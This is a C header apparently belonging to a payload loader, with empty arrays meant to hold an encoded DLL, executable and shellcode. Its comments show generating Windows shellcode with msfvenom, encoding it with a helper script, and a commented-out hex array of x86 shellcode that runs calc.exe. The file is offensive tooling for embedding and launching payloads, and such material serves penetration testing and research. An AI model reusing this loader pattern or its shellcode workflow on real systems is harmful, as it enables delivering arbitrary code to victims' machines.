#pragma once

// encode using x-encode.py

// dll
char *xl[] = { NULL };

// executable
char *xe[] = { NULL };

// shellcode
char *xf[] = { NULL };

// calc (x86) example:
// $ msfvenom -p windows/exec CMD=calc.exe -f raw >calc_x86
// $ cat calc_x86 | python x-encode.py xf 0

// xorbyte = 0

//char *xf[] = {
//"fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c02",
//"2c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e3",
//"3a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b",
//"0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d",
//"85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb",
//"4713726f6a0053ffd563616c632e65786500",
//};
